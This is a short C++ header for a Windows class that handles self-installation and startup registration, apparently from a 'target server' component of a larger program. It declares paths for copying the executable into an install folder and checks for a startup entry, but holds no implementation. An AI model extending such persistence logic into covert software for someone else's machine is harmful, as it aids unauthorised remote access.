//
// Created by Berlingot on 2023-04-20.
//

#ifndef SERVEUR___CIBLE_INSTALLATIONANDSTART_H
#define SERVEUR___CIBLE_INSTALLATIONANDSTART_H


#include <Windows.h>
#include <string>
#include <tchar.h>
#include <cstdio>
#include <time.h>
#include <fstream>
#include <thread>


#include "string"
#include "Settings.h"
#include "OperationState.h"

class installationAndStart {
public:
    //variables
    static std::string CurrentPath;			//current path of executable
    static std::string installationFolder;		//path of folder it should be installed to
    static std::string installationPath;			//full path where executable should be installed to
    static bool installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,

    static bool locationSet();	//installation path
    static bool startupSet();	//demarrage path
    static bool installed();	//installation dans le path


    static std::string getInstallFolder();
    static std::string getCurrentPath();
    static std::string getInstallationPath(std::string instFolder);



    //instead of proceeding to the main loop)
    //static LPTSTR lpArguments;

    //Fonctions
    static OperationState init();

};

#endif //SERVEUR___CIBLE_INSTALLATIONANDSTART_H
